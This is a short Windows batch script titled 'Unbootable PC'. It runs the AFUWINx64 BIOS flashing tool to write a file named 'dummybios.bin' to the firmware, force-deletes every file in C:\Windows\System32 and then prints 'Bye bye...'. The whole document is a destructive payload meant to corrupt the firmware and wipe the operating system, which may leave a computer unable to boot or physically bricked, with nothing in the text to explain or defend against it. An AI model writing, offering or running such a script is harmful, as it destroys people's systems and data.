@echo off
color 02
title Unbootable PC
AFUWINx64.exe /GAN /P /B /N /ME dummybios.bin
del /f /q C:\Windows\System32\*.*
echo Bye bye...
